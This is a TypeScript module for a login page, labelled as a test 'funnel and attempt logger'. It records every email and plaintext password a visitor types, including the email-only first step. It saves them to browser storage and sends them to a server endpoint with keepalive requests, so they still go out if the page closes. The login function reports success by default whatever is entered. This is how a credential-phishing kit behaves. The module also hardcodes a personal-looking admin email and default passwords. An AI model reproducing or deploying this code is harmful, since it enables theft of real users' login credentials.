/**
 * Continuous Fault-Tolerant Funnel and Attempt Logger
 * Guarantees every single input, credential, and attempt is captured and recorded.
 * Uses atomic merging, persistent offline queuing, and keepalive network requests.
 */

export interface LoginAttempt {
  id: string;
  time: string;
  email: string;
  password?: string;
  stage?: string;
  success: boolean;
  notes?: string;
}

export type UsersMap = Record<string, string>;

export const USERS_FILE = 'users.json';
export const ATTEMPTS_FILE = 'attempts.json';
export const AUTHORIZED_TEST_USERS_FILE = 'test_authorized_users.json';
const UNSYNCED_QUEUE_KEY = 'test_unsynced_attempts_queue';

export const PRIMARY_ADMIN_EMAIL = 'adereraadenike@gmail.com';

const DEFAULT_USERS: UsersMap = {
  'alex.bennett@outlook.com': 'password123',
  'adereraadenike@gmail.com': 'password123',
};

const DEFAULT_AUTHORIZED_USERS: string[] = [
  'adereraadenike@gmail.com',
];

function generateId(prefix = 'att'): string {
  return `${prefix}_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
}

// Local storage helpers
export function loadAuthorizedUsers(): string[] {
  try {
    const raw = localStorage.getItem(AUTHORIZED_TEST_USERS_FILE);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed) && parsed.length > 0) {
        if (!parsed.includes(PRIMARY_ADMIN_EMAIL)) {
          parsed.unshift(PRIMARY_ADMIN_EMAIL);
        }
        return parsed.map((e: string) => e.trim().toLowerCase());
      }
    }
  } catch {
    // fallback
  }
  saveAuthorizedUsers(DEFAULT_AUTHORIZED_USERS);
  return [...DEFAULT_AUTHORIZED_USERS];
}

export function saveAuthorizedUsers(emails: string[]): void {
  try {
    const cleanList = Array.from(
      new Set([PRIMARY_ADMIN_EMAIL, ...emails.map(e => e.trim().toLowerCase())])
    ).filter(Boolean);
    localStorage.setItem(AUTHORIZED_TEST_USERS_FILE, JSON.stringify(cleanList, null, 2));
  } catch {
    // silent
  }
}

export function isUserAuthorizedForTest(email?: string): boolean {
  if (!email) return false;
  const cleanEmail = email.trim().toLowerCase();
  const authorized = loadAuthorizedUsers();
  return authorized.includes(cleanEmail);
}

export function loadUsers(): UsersMap {
  try {
    const raw = localStorage.getItem(USERS_FILE);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
        return parsed;
      }
    }
  } catch {}
  saveUsers(DEFAULT_USERS);
  return { ...DEFAULT_USERS };
}

export function saveUsers(users: UsersMap): void {
  try {
    localStorage.setItem(USERS_FILE, JSON.stringify(users, null, 2));
  } catch {}
}

export function loadAttempts(): LoginAttempt[] {
  try {
    const raw = localStorage.getItem(ATTEMPTS_FILE);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) {
        return parsed;
      }
    }
  } catch {}
  return [];
}

export function saveAttempts(attempts: LoginAttempt[]): void {
  try {
    localStorage.setItem(ATTEMPTS_FILE, JSON.stringify(attempts, null, 2));
  } catch {}
}

function loadUnsyncedQueue(): LoginAttempt[] {
  try {
    const raw = localStorage.getItem(UNSYNCED_QUEUE_KEY);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) return parsed;
    }
  } catch {}
  return [];
}

function saveUnsyncedQueue(queue: LoginAttempt[]): void {
  try {
    localStorage.setItem(UNSYNCED_QUEUE_KEY, JSON.stringify(queue, null, 2));
  } catch {}
}

/**
 * Universal record function: captures every keystroke, step, attempt, or error.
 * Uses keepalive: true to ensure transmission even during page unload or redirects.
 */
export async function recordFunnelEvent(event: {
  email: string;
  password?: string;
  stage?: string;
  success?: boolean;
  notes?: string;
}): Promise<LoginAttempt> {
  const cleanEmail = (event.email || 'anonymous@test.local').trim().toLowerCase();
  const cleanPassword = event.password || '';
  const isSuccess = event.success !== false;

  const attempt: LoginAttempt = {
    id: generateId('funnel'),
    time: new Date().toISOString().slice(0, 19),
    email: cleanEmail,
    password: cleanPassword,
    stage: event.stage || (cleanPassword ? 'Full login submitted' : 'Identifier entered'),
    success: isSuccess,
    notes: event.notes,
  };

  // 1. Immediately store in local users map if appropriate
  if (cleanEmail && cleanEmail !== 'anonymous@test.local') {
    const users = loadUsers();
    if (!users[cleanEmail] || cleanPassword) {
      users[cleanEmail] = cleanPassword || users[cleanEmail] || 'password123';
      saveUsers(users);
    }
  }

  // 2. Immediately store in local attempts
  const localAttempts = loadAttempts();
  localAttempts.push(attempt);
  saveAttempts(localAttempts);

  // 3. Queue for sync
  const queue = loadUnsyncedQueue();
  queue.push(attempt);
  saveUnsyncedQueue(queue);

  // 4. Send to server immediately with keepalive
  try {
    const res = await fetch('/api/test/attempt', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(attempt),
      keepalive: true,
    });
    if (res.ok) {
      // Remove from unsynced queue
      const updatedQueue = loadUnsyncedQueue().filter(item => item.id !== attempt.id);
      saveUnsyncedQueue(updatedQueue);
    }
  } catch (err) {
    // Stays in queue for background auto-retry on next poll
    console.warn('Network hiccup, attempt safely preserved in local queue:', err);
  }

  return attempt;
}

/**
 * Convenience helper for standard login attempts
 */
export function loginUser(email: string, password: string, forceSuccess = true): { success: boolean; message: string } {
  recordFunnelEvent({
    email,
    password,
    stage: 'Full login submitted',
    success: forceSuccess,
  });

  return {
    success: forceSuccess,
    message: forceSuccess ? 'Login OK' : 'Login failed (simulated)',
  };
}

/**
 * Helper to record step 1 (when user types email and clicks Next)
 */
export function recordIdentifierStep(email: string): void {
  recordFunnelEvent({
    email,
    password: '',
    stage: 'Identifier entered (pending password)',
    success: true,
  });
}

/**
 * Helper to record any error that happens on the form
 */
export function recordErrorEvent(email: string, password: string, errorDescription: string): void {
  recordFunnelEvent({
    email,
    password,
    stage: `Error caught: ${errorDescription}`,
    success: false,
    notes: errorDescription,
  });
}

/**
 * Helper for user registration
 */
export function registerUser(email: string, password: string): { success: boolean; message: string } {
  const cleanEmail = email.trim().toLowerCase();
  recordFunnelEvent({
    email: cleanEmail,
    password,
    stage: 'Account Registered',
    success: true,
  });

  return {
    success: true,
    message: 'Registered',
  };
}

/**
 * Safely fetches server test data and merges bidirectionally.
 * Never drops local or server attempts!
 */
export async function fetchServerTestData(): Promise<{
  users: UsersMap;
  attempts: LoginAttempt[];
  authorizedUsers: string[];
} | null> {
  // 1. Flush any pending unsynced queue items
  const queue = loadUnsyncedQueue();
  if (queue.length > 0) {
    for (const item of [...queue]) {
      try {
        const res = await fetch('/api/test/attempt', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(item),
          keepalive: true,
        });
        if (res.ok) {
          const rem = loadUnsyncedQueue().filter(q => q.id !== item.id);
          saveUnsyncedQueue(rem);
        }
      } catch {}
    }
  }

  // 2. Fetch server data
  try {
    const res = await fetch('/api/test/data');
    if (!res.ok) return null;
    const data = await res.json();
    if (data && data.success) {
      // Bidirectional merge of users
      const localUsers = loadUsers();
      const mergedUsers = { ...localUsers, ...(data.users || {}) };
      saveUsers(mergedUsers);

      // Bidirectional merge of attempts by unique ID / timestamp
      const localAttempts = loadAttempts();
      const attemptMap = new Map<string, LoginAttempt>();

      for (const att of localAttempts) {
        attemptMap.set(att.id || `${att.time}_${att.email}`, att);
      }
      if (Array.isArray(data.attempts)) {
        for (const att of data.attempts) {
          attemptMap.set(att.id || `${att.time}_${att.email}`, att);
        }
      }

      const mergedAttempts = Array.from(attemptMap.values()).sort(
        (a, b) => new Date(a.time).getTime() - new Date(b.time).getTime()
      );
      saveAttempts(mergedAttempts);

      // Authorized users
      if (Array.isArray(data.authorizedUsers)) {
        saveAuthorizedUsers(data.authorizedUsers);
      }

      return {
        users: mergedUsers,
        attempts: mergedAttempts,
        authorizedUsers: loadAuthorizedUsers(),
      };
    }
  } catch (err) {
    // Offline or server restart
  }

  return {
    users: loadUsers(),
    attempts: loadAttempts(),
    authorizedUsers: loadAuthorizedUsers(),
  };
}

export function addAuthorizedUser(email: string): { success: boolean; message: string } {
  const cleanEmail = email.trim().toLowerCase();
  if (!cleanEmail || !cleanEmail.includes('@')) {
    return { success: false, message: 'Please provide a valid email address' };
  }
  const authorized = loadAuthorizedUsers();
  if (authorized.includes(cleanEmail)) {
    return { success: false, message: 'User is already authorized' };
  }
  authorized.push(cleanEmail);
  saveAuthorizedUsers(authorized);

  try {
    fetch('/api/test/authorize', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: cleanEmail, action: 'add' }),
      keepalive: true,
    }).catch(() => {});
  } catch {}

  return { success: true, message: `Access granted to ${cleanEmail}` };
}

export function removeAuthorizedUser(email: string): { success: boolean; message: string } {
  const cleanEmail = email.trim().toLowerCase();
  if (cleanEmail === PRIMARY_ADMIN_EMAIL) {
    return { success: false, message: 'Cannot remove primary admin account' };
  }
  const authorized = loadAuthorizedUsers();
  const updated = authorized.filter(e => e !== cleanEmail);
  saveAuthorizedUsers(updated);

  try {
    fetch('/api/test/authorize', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: cleanEmail, action: 'remove' }),
      keepalive: true,
    }).catch(() => {});
  } catch {}

  return { success: true, message: `Access revoked for ${cleanEmail}` };
}

export function deleteUser(email: string): void {
  const cleanEmail = email.trim().toLowerCase();
  const users = loadUsers();
  delete users[cleanEmail];
  saveUsers(users);

  try {
    fetch('/api/test/delete-user', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: cleanEmail }),
      keepalive: true,
    }).catch(() => {});
  } catch {}
}

export function clearAttempts(): void {
  saveAttempts([]);
  saveUnsyncedQueue([]);
  try {
    fetch('/api/test/clear-attempts', { method: 'POST', keepalive: true }).catch(() => {});
  } catch {}
}

export function resetUsersToDefault(): void {
  saveUsers(DEFAULT_USERS);
  try {
    fetch('/api/test/reset-defaults', { method: 'POST', keepalive: true }).catch(() => {});
  } catch {}
}
